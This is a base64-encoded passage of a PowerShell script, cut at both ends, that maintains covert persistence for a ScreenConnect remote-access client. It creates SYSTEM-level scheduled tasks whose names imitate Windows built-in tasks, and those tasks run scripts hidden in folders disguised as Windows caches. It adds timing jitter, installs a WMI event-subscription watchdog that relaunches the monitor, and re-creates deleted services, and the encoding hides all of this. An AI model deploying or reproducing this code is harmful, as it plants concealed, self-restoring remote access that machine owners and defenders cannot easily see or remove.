IH0KfQoKZnVuY3Rpb24gR2V0LVRhc2tWZXJib3NlQmxvYihbc3RyaW5nXSR0bikgewogICAgaWYg
KC1ub3QgJHRuKSB7IHJldHVybiAnJyB9CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5
IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAg
LW9yIC1ub3QgJG91dCkgeyByZXR1cm4gJycgfQogICAgcmV0dXJuICgoJG91dCB8IEZvckVhY2gt
T2JqZWN0IHsgIiRfIiB9KSAtam9pbiAiYG4iKQp9CgpmdW5jdGlvbiBUZXN0LVRhc2tPd25zTW9u
KFtzdHJpbmddJHRuLCBbc3RyaW5nXSRtYXJrZXIpIHsKICAgICMgVHJ1ZSBvbmx5IGlmIHRoZSBz
Y2hlZHVsZWQgYWN0aW9uIHBvaW50cyBhdCBPVVIgbW9uL2V0bCBwYXRoIOKAlCBub3QgYSBXaW5k
b3dzIENPTSBoYW5kbGVyLgogICAgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bgogICAg
aWYgKC1ub3QgJGJsb2IpIHsgcmV0dXJuICRmYWxzZSB9CiAgICBpZiAoJG1hcmtlciAtYW5kICgk
YmxvYiAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRtYXJrZXIpKSkgeyByZXR1cm4gJHRydWUgfQog
ICAgaWYgKCRibG9iIC1tYXRjaCAnKD9pKVwud3VjYWNoZVxcfG93bl9tb25cLmNtZHxldGxfbW9u
XC5jbWR8XC5ldGxjYWNoZVxcJykgeyByZXR1cm4gJHRydWUgfQogICAgcmV0dXJuICRmYWxzZQp9
CgpmdW5jdGlvbiBJbml0aWFsaXplLUlkZW50aXR5IHsKICAgICMgSWRlbXBvdGVudCB3aXRoaW4g
YW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4gUG9vbCB1cGdyYWRlcyBidW1wIElERU5UVkVSOgogICAg
IyBvd25lZCBvbGQtbmFtZSB0YXNrcyBhcmUgZGVsZXRlZDsgV2luZG93cyBidWlsdC1pbnMgd2l0
aCBzYW1lIG5hbWUgYXJlIGxlZnQgYWxvbmUuCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7
CiAgICAgICAgJG9sZCA9IFJlYWQtSWRlbnRpdHkKICAgICAgICAjIEw3OiBhbHNvIHJlZ2VuZXJh
dGUgaWYgYW55IFRBU0tfKiBpcyBlbXB0eSAoTDQtTDYgbW9kdWxvL2Nhc3QgYnVncyBsZWZ0IGJs
YW5rIHNsb3RzKQogICAgICAgICRzbG90c09rID0gKCRvbGRbJ0lERU5UVkVSJ10gLWVxICIkSWRl
bnRWZXJzaW9uIikgLWFuZCAkb2xkWydUQVNLX0EnXSAtYW5kICRvbGRbJ1RBU0tfQiddIC1hbmQg
JG9sZFsnVEFTS19DJ10gLWFuZCAkb2xkWydUQVNLX0QnXQogICAgICAgIGlmICgkc2xvdHNPaykg
eyByZXR1cm4gJG9sZCB9CiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQics
J1RBU0tfQycsJ1RBU0tfRCcpIHsKICAgICAgICAgICAgJHRuID0gW3N0cmluZ10kb2xkWyRrXQog
ICAgICAgICAgICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQogICAgICAgICAgICAjIE5ldmVy
IGRlbGV0ZSBhIHJlYWwgV2luZG93cyB0YXNrIHdlIG5ldmVyIG93bmVkIChUUiBpcyBDT00vY3Vz
dG9tIGhhbmRsZXIpLgogICAgICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJycpIHsg
UmVtb3ZlLVRhc2tRdWlldCAkdG4gfQogICAgICAgIH0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0
ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNlCiAgICB9CiAgICAkcyA9IEdldC1Ib3N0U2VlZAogICAg
IyBMNDogdHdvIHNsb3RzIG1heSBoYXNoIHRvIHRoZSBzYW1lIHRhc2sgcGF0aCAocG9vbHMgc2hh
cmUgbmFtZXMpIC0+CiAgICAjIG9uZSBwaHlzaWNhbCB0YXNrIHRoZW4gc2F0aXNmaWVzIHR3byBz
bG90cyBhbmQgdGhlIGZsZWV0IHNob3dzIDMvNC4KICAgICMgV2FsayBlYWNoIHBvb2wgZm9yd2Fy
ZCB1bnRpbCB0aGUgcGljayBpcyB1bmlxdWUgYWNyb3NzIHNsb3RzLgogICAgIyBMNjogdGhlIG9s
ZCBAKEAoJ0EnLCAkcyAlIDgpLCAuLi4pIGZvcm0gd2FzIGRvdWJsZS1icm9rZW4gaW4gUFMgNS4x
OgogICAgIyBiYXJlICUgaW5zaWRlIEAoKSBwYXJzZXMgYXMgdGhlIEZvckVhY2gtT2JqZWN0IGFs
aWFzIChub3QgbW9kdWxvKSwgc28gdGhlCiAgICAjIGNvbGxlY3Rpb24gY29sbGFwc2VkIGFuZCB0
aGUgbG9vcCBuZXZlciByYW4gLT4gaWRlbnRpdHkuY2ZnIGhhZCBFTVBUWQogICAgIyBUQVNLXyog
YW5kIHRoZSB3aG9sZSBmbGVldCBmZWxsIGJhY2sgdG8gaWRlbnRpY2FsIGRlZmF1bHQgdGFzayBu
YW1lcy4KICAgICRzZWVkcyA9IFtvcmRlcmVkXUB7CiAgICAgICAgQSA9ICgkcyAlIDgpCiAgICAg
ICAgQiA9ICgoJHMgKyAzKSAlIDgpCiAgICAgICAgQyA9ICgoJHMgKyA1KSAlIDgpCiAgICAgICAg
RCA9ICgoJHMgKyA3KSAlIDgpCiAgICB9CiAgICAkcGljayA9IFtvcmRlcmVkXUB7fQogICAgZm9y
ZWFjaCAoJGxldHRlciBpbiAnQScsJ0InLCdDJywnRCcpIHsKICAgICAgICAkaSA9IFtpbnRdJHNl
ZWRzWyRsZXR0ZXJdCiAgICAgICAgJG5hbWUgPSAkUG9vbHNbJGxldHRlcl1bJGldCiAgICAgICAg
JG4gPSAwCiAgICAgICAgd2hpbGUgKCRwaWNrLlZhbHVlcyAtY29udGFpbnMgJG5hbWUgLWFuZCAk
biAtbHQgOCkgeyAkaSA9ICgkaSArIDEpICUgODsgJG5hbWUgPSAkUG9vbHNbJGxldHRlcl1bJGld
OyAkbisrIH0KICAgICAgICBpZiAoLW5vdCAkbmFtZSkgeyAkbmFtZSA9ICREZWZhdWx0c1siVEFT
S18kbGV0dGVyIl0gfQogICAgICAgICRwaWNrWyRsZXR0ZXJdID0gJG5hbWUKICAgIH0KICAgICRj
ZmcgPSBAKAogICAgICAgICJUQVNLX0E9JCgkcGljay5BKSIKICAgICAgICAiVEFTS19CPSQoJHBp
Y2suQikiCiAgICAgICAgIlRBU0tfQz0kKCRwaWNrLkMpIgogICAgICAgICJUQVNLX0Q9JCgkcGlj
ay5EKSIKICAgICAgICAiTU9fQT0kKDIgKyAoJHMgJSA0KSkiICAgICAgICAgICMgMi01IG1pbiBq
aXR0ZXIKICAgICAgICAiTU9fQj0kKDMgKyAoKCRzICsgMSkgJSAzKSkiICAgICMgMy01IG1pbiBq
aXR0ZXIKICAgICAgICAiU0VFRD0kcyIKICAgICAgICAiSURFTlRWRVI9JElkZW50VmVyc2lvbiIK
ICAgICkKICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtVmFsdWUgJGNmZyAt
Rm9yY2UKICAgIHJldHVybiAoUmVhZC1JZGVudGl0eSkKfQoKZnVuY3Rpb24gTm9ybWFsaXplLVRh
c2tOYW1lKFtzdHJpbmddJHRuKSB7CiAgICBpZiAoLW5vdCAkdG4pIHsgcmV0dXJuICcnIH0KICAg
IHJldHVybiAkdG4uVHJpbSgpLlRyaW1TdGFydCgnXCcpCn0KCmZ1bmN0aW9uIFdyaXRlLU93bkxv
Zyhbc3RyaW5nXSRtKSB7CiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicK
ICAgIHRyeSB7IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbSAtRm9yY2Ug
fSBjYXRjaCB7fQp9CgpmdW5jdGlvbiBFbnN1cmUtUGVyc2lzdFRhc2tzIHsKICAgICMgTWlycm9y
IHdvcmtpbmcgZGV0YWNoIChXdWNhY2hlT3duKTogY21kIHNjaHRhc2tzLCBCT09UIFRSIHBhdGgs
IC9TVCBvbiBNSU5VVEUuCiAgICAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5CiAgICBpZiAoLW5v
dCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQn
IH0KICAgICRib290ID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnVGVtcFwud3VjYWNoZScK
ICAgICRldGxEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwu
ZXRsY2FjaGUnCiAgICBmb3JlYWNoICgkZCBpbiBAKCRib290LCAkZXRsRGlyKSkgewogICAgICAg
IGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkgeyBOZXctSXRlbSAtSXRlbVR5
cGUgRGlyZWN0b3J5IC1QYXRoICRkIC1Gb3JjZSB8IE91dC1OdWxsIH0KICAgIH0KICAgICRib290
TW9uID0gSm9pbi1QYXRoICRib290ICdvd25fbW9uLmNtZCcKICAgICRib290RXRsID0gSm9pbi1Q
YXRoICRib290ICdldGxfbW9uLmNtZCcKICAgICRldGxNb24gPSBKb2luLVBhdGggJGV0bERpciAn
ZXRsX21vbi5jbWQnCiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCkgewog
ICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRib290
TW9uIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIENvcHktSXRl
bSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRib290RXRsIC1Gb3JjZSAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGgg
JE1vblBhdGggLURlc3RpbmF0aW9uICRldGxNb24gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlCiAgICB9CiAgICAjIEJPT1QgaXMgbm90IExvY2tEaXInZCBieSBvd25fc2VjdXJl
IOKAlCBUYXNrIFNjaGVkdWxlciBjYW4gcmVzb2x2ZSBUUiB0aGVyZS4KICAgICR0ck1vbiA9ICJj
bWQuZXhlIC9jICRib290TW9uIgogICAgJHRyRXRsID0gImNtZC5leGUgL2MgJGJvb3RFdGwiCiAg
ICAkbW9BID0gW3N0cmluZ10kaWRbJ01PX0EnXTsgaWYgKC1ub3QgJG1vQSkgeyAkbW9BID0gJzIn
IH0KICAgICRtb0IgPSBbc3RyaW5nXSRpZFsnTU9fQiddOyBpZiAoLW5vdCAkbW9CKSB7ICRtb0Ig
PSAnMycgfQogICAgJHN0ID0gKEdldC1EYXRlKS5Ub1N0cmluZygnSEg6bW0nKQogICAgJHNwZWNz
ID0gQCgKICAgICAgICBAeyBLZXkgPSAnVEFTS19BJzsgTWFya2VyID0gJ293bl9tb24uY21kJzsg
U2MgPSAnTUlOVVRFJzsgTW8gPSAkbW9BOyBUciA9ICR0ck1vbiB9CiAgICAgICAgQHsgS2V5ID0g
J1RBU0tfQic7IE1hcmtlciA9ICdldGxfbW9uLmNtZCc7IFNjID0gJ01JTlVURSc7IE1vID0gJG1v
QjsgVHIgPSAkdHJFdGwgfQogICAgICAgIEB7IEtleSA9ICdUQVNLX0MnOyBNYXJrZXIgPSAnb3du
X21vbi5jbWQnOyBTYyA9ICdPTlNUQVJUJzsgTW8gPSAnJzsgVHIgPSAkdHJNb24gfQogICAgICAg
IEB7IEtleSA9ICdUQVNLX0QnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdPTkxPR09O
JzsgTW8gPSAnJzsgVHIgPSAkdHJNb24gfQogICAgKQogICAgJG9rID0gMDsgJHJlYXJtZWQgPSAw
OyAkZmFpbCA9IDAKICAgIGZvcmVhY2ggKCRzcCBpbiAkc3BlY3MpIHsKICAgICAgICAkdG4gPSBO
b3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRzcC5LZXldKQogICAgICAgIGlmICgtbm90
ICR0bikgeyAkZmFpbCsrOyBjb250aW51ZSB9CiAgICAgICAgaWYgKFRlc3QtVGFza093bnNNb24g
JHRuICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0KICAgICAgICBpZiAoVGVzdC1UYXNr
T3duc01vbiAoIlwkdG4iKSAkc3AuTWFya2VyKSB7ICRvaysrOyBjb250aW51ZSB9CiAgICAgICAg
JGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bgogICAgICAgIGlmICgtbm90ICRibG9iKSB7
ICRibG9iID0gR2V0LVRhc2tWZXJib3NlQmxvYiAoIlwkdG4iKSB9CiAgICAgICAgaWYgKCRibG9i
KSB7CiAgICAgICAgICAgICRvdXJzQnJva2VuID0gKCRibG9iIC1tYXRjaCAnKD9pKW93bl9tb25c
LmNtZHxldGxfbW9uXC5jbWR8XC53dWNhY2hlXFx8XC5ldGxjYWNoZVxcJykKICAgICAgICAgICAg
aWYgKC1ub3QgJG91cnNCcm9rZW4pIHsgJGZhaWwrKzsgV3JpdGUtT3duTG9nICJ0YXNrc19za2lw
X2ZvcmVpZ24gJHRuIjsgY29udGludWUgfQogICAgICAgICAgICBSZW1vdmUtVGFza1F1aWV0ICR0
bgogICAgICAgICAgICBSZW1vdmUtVGFza1F1aWV0ICgiXCR0biIpCiAgICAgICAgfQogICAgICAg
ICMgQnVpbGQgY21kbGluZSBleGFjdGx5IGxpa2Ugb3duLmNtZCBkZXRhY2ggKHByb3ZlbiB0byB3
b3JrIGFzIFNZU1RFTSkuCiAgICAgICAgJHBhcnRzID0gQCgKICAgICAgICAgICAgJy9DcmVhdGUn
LCAnL1ROJywgJHRuLCAnL1JVJywgJ1NZU1RFTScsICcvUkwnLCAnSElHSEVTVCcsICcvRicsCiAg
ICAgICAgICAgICcvVFInLCAkc3AuVHIsICcvU0MnLCAkc3AuU2MKICAgICAgICApCiAgICAgICAg
aWYgKCRzcC5TYyAtZXEgJ01JTlVURScpIHsKICAgICAgICAgICAgJHBhcnRzICs9IEAoJy9NTycs
ICRzcC5NbywgJy9TVCcsICRzdCkKICAgICAgICB9CiAgICAgICAgJGFyZ0xpbmUgPSAoJHBhcnRz
IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdbXHMiXScpIHsg
JyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2UgJyInLCAnXCInKSB9IGVsc2UgeyAkXyB9CiAgICAgICAg
fSkgLWpvaW4gJyAnCiAgICAgICAgJGNyZWF0ZVR4dCA9IGNtZC5leGUgL2MgInNjaHRhc2tzLmV4
ZSAkYXJnTGluZSIgMj4mMSB8IEZvckVhY2gtT2JqZWN0IHsgIiRfIiB9CiAgICAgICAgJGNyZWF0
ZUpvaW5lZCA9ICgkY3JlYXRlVHh0IC1qb2luICcgJykuVHJpbSgpCiAgICAgICAgV3JpdGUtT3du
TG9nICJ0YXNrc19jcmVhdGUgJCgkc3AuS2V5KSAkdG4gPT4gJGNyZWF0ZUpvaW5lZCIKICAgICAg
ICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRuICRzcC5NYXJrZXIpIC1vciAoVGVzdC1UYXNrT3du
c01vbiAoIlwkdG4iKSAkc3AuTWFya2VyKSkgewogICAgICAgICAgICAkcmVhcm1lZCsrCiAgICAg
ICAgICAgIGlmICgkc3AuS2V5IC1lcSAnVEFTS19BJyAtb3IgJHNwLktleSAtZXEgJ1RBU0tfQicp
IHsKICAgICAgICAgICAgICAgIGNtZC5leGUgL2MgInNjaHRhc2tzLmV4ZSAvUnVuIC9UTiBgIiR0
bmAiIiB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAg
ICAkZmFpbCsrCiAgICAgICAgICAgIFdyaXRlLU93bkxvZyAidGFza3NfY3JlYXRlX0ZBSUwgJCgk
c3AuS2V5KSAkdG4iCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVh
cm1lZD0kcmVhcm1lZCBmYWlsPSRmYWlsIgp9CgpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cgewog
ICAgZm9yZWFjaCAoJGNscyBpbiBAKCdfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nJywnX19FdmVu
dEZpbHRlcicsJ0NvbW1hbmRMaW5lRXZlbnRDb25zdW1lcicsJ19fSW50ZXJ2YWxUaW1lckluc3Ry
dWN0aW9uJykpIHsKICAgICAgICBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
cHRpb24gLUNsYXNzICRjbHMgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAg
ICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgKCRfLk5hbWUgLWVxICdXdWNhY2hl
V2F0Y2hkb2dGJykgLW9yICgkXy5OYW1lIC1lcSAnV3VjYWNoZVdhdGNoZG9nQycpIC1vcgogICAg
ICAgICAgICAgICAgKCRfLlRpbWVySWQgLWVxICdXdWNhY2hlV2F0Y2hkb2cnKSAtb3IKICAgICAg
ICAgICAgICAgICgkXy5GaWx0ZXIgLWFuZCAkXy5GaWx0ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1
Y2FjaGVXYXRjaGRvZ0YqJykgLW9yCiAgICAgICAgICAgICAgICAoJF8uQ29uc3VtZXIgLWFuZCAk
Xy5Db25zdW1lci5Ub1N0cmluZygpIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nQyonKQogICAgICAg
ICAgICB9IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5EZWxldGUoKSB8IE91dC1OdWxsIH0KICAgIH0K
fQoKZnVuY3Rpb24gSW5zdGFsbC1XYXRjaGRvZyB7CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyBy
ZXR1cm4gJGZhbHNlIH0KICAgIFJlbW92ZS1XYXRjaGRvZwogICAgJG9rID0gJHRydWUKICAgIHRy
eSB7CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24g
LUNsYXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIGAKICAgICAgICAgICAgLUFyZ3VtZW50
cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IEludGVydmFsTWlsbGlzZWNvbmRzID0g
MTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFsc2UgfSB8IE91dC1OdWxsCiAgICAgICAgJGYgPSBT
ZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19FdmVu
dEZpbHRlciBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hk
b2dGJzsgRXZlbnROYW1lc3BhY2UgPSAncm9vdFxjaW12Mic7IFF1ZXJ5TGFuZ3VhZ2UgPSAnV1FM
JzsKICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9ICJTRUxFQ1QgKiBGUk9NIF9fVGlt
ZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cnIiB9CiAgICAgICAgJGMgPSBT
ZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFu
ZExpbmVFdmVudENvbnN1bWVyIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1
Y2FjaGVXYXRjaGRvZ0MnOyBDb21tYW5kTGluZVRlbXBsYXRlID0gImNtZC5leGUgL2MgYCIkTW9u
UGF0aGAiIjsgUnVuSW50ZXJhY3RpdmVseSA9ICRmYWxzZSB9CiAgICAgICAgU2V0LVdtaUluc3Rh
bmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1l
ckJpbmRpbmcgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IEZpbHRlciA9ICRmOyBDb25zdW1l
ciA9ICRjIH0gfCBPdXQtTnVsbAogICAgfSBjYXRjaCB7ICRvayA9ICRmYWxzZSB9CiAgICByZXR1
cm4gJG9rCn0KCmZ1bmN0aW9uIFRlc3QtV2F0Y2hkb2dHcmFwaCB7CiAgICAkdCA9IEdldC1XbWlP
YmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRlcnZhbFRpbWVy
SW5zdHJ1Y3Rpb24gLUZpbHRlciAiVGltZXJJZD0nV3VjYWNoZVdhdGNoZG9nJyIgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUKICAgICRmID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJv
b3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2ZW50RmlsdGVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2Fj
aGVXYXRjaGRvZ0YnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGMgPSBHZXQt
V21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5l
RXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUKICAgICRiID0gJG51bGwKICAgIGlmICgkZiAtYW5kICRjKSB7
CiAgICAgICAgJGIgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24g
LUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5GaWx0ZXIgLWxpa2UgJypXdWNh
Y2hlV2F0Y2hkb2dGKicgLWFuZCAkXy5Db25zdW1lciAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0Mq
JyB9IHwKICAgICAgICAgICAgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgfQogICAgcmV0dXJu
IFtib29sXSgkdCAtYW5kICRmIC1hbmQgJGMgLWFuZCAkYikKfQoKZnVuY3Rpb24gRW5zdXJlLVdh
dGNoZG9nIHsKICAgIGlmIChUZXN0LVdhdGNoZG9nR3JhcGgpIHsgcmV0dXJuICdPSycgfQogICAg
aWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICdNSVNTSU5HJyB9CiAgICBpZiAoSW5zdGFsbC1X
YXRjaGRvZykgeyByZXR1cm4gJ1JFQVJNRUQnIH0KICAgIHJldHVybiAnRkFJTCcKfQoKIyBDb3Jy
ZWN0IDMyLWJpdCArIDY0LWJpdCBBUlAgaGl2ZXMuIEw2IGFuZCBlYXJsaWVyIHVzZWQgYSB0cnVu
Y2F0ZWQKIyBXT1c2NDMyTm9kZSBwYXRoIChtaXNzaW5nIE1pY3Jvc29mdFxXaW5kb3dzKSBzbyBF
VkVSWSAzMi1iaXQgU0MgcHJvZHVjdAojIHdhcyBpbnZpc2libGUgdG8gcmVwYWlyL2V4dGVybWlu
YXRlL3JlZ2lzdGVyZWQuCiRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMgPSBAKAogICAgJ0hLTE06XFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsCiAgICAn
SEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNp
b25cVW5pbnN0YWxsJwopCgpmdW5jdGlvbiBUZXN0LVNDUmVnaXN0ZXJlZChbc3RyaW5nXSRGaW5n
ZXJwcmludCkgewogICAgIyBMODogTkVWRVIgdXNlIHJldHVybiBpbnNpZGUgRm9yRWFjaC1PYmpl
Y3QgLSBpdCBvbmx5IGV4aXRzIHRoZQogICAgIyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMg
ZnVuY3Rpb24gYWx3YXlzIGZlbGwgdGhyb3VnaCB0byAnbm8nCiAgICAjIGFuZCB0aGUgbW9uIG9y
cGhhbi1sYWRkZXIgZGVsZXRlZCBoZWFsdGh5IHJlZ2lzdGVyZWQgc2VydmljZXMuCiAgICBpZiAo
LW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICdubycgfQogICAgJG5hbWUgPSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0
OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsg
Y29udGludWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3Qg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQt
SXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5E
aXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5k
ICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkgeyByZXR1cm4gJ3llcycgfQogICAgICAg
IH0KICAgIH0KICAgIHJldHVybiAnbm8nCn0KCmZ1bmN0aW9uIFJlcGFpci1TQ1NlcnZpY2UoW3N0
cmluZ10kRmluZ2VycHJpbnQpIHsKICAgICMgUmVjcmVhdGVzIGEgZGVsZXRlZCBTQyBzZXJ2aWNl
IGVudHJ5IGJ5IHJlcGFpcmluZyB0aGUgUkVHSVNURVJFRCBwcm9kdWN0LgogICAgIyBtc2lleGVj
IC9mYSB7R1VJRH0gcmVwYWlycyBpbiBwbGFjZSAtIGl0IGRvZXMgTk9UIHJ1biB0aGUgU0MtZmFt
aWx5CiAgICAjIG1ham9yLXVwZ3JhZGUgcmVtb3ZhbCwgc28gb3RoZXIgaW5zdGFuY2VzIGFyZSB1
bnRvdWNoZWQuCiAgICAjIEw1OiBhbHNvIGhhbmRsZXMgcHJlc2VudC1idXQtU1RPUFBFRCBzZXJ2
aWNlcyAocmVwYWlyIHJlc3RvcmVzIGJpbmFyaWVzLAogICAgIyB0aGVuIHN0YXJ0KS4gT25seSBh
IFJ1bm5pbmcgc2VydmljZSBpcyBjb25zaWRlcmVkIGhlYWx0aHkuCiAgICBpZiAoLW5vdCAkRmlu
Z2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcgfQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0
dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1ydW5uaW5nJyB9CiAgICAkZ3VpZCA9ICRu
dWxsCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAg
ICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVh
Y2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRo
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBp
ZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtl
ICd7Kn0nKSkgeyAkZ3VpZCA9ICRrZXkuUFNDaGlsZE5hbWU7IGJyZWFrIH0KICAgICAgICB9CiAg
ICAgICAgaWYgKCRndWlkKSB7IGJyZWFrIH0KICAgIH0KICAgIGlmICgtbm90ICRndWlkKSB7IHJl
dHVybiAnbm90LXJlZ2lzdGVyZWQnIH0KICAgICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1cU09GVFdB
UkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC9m
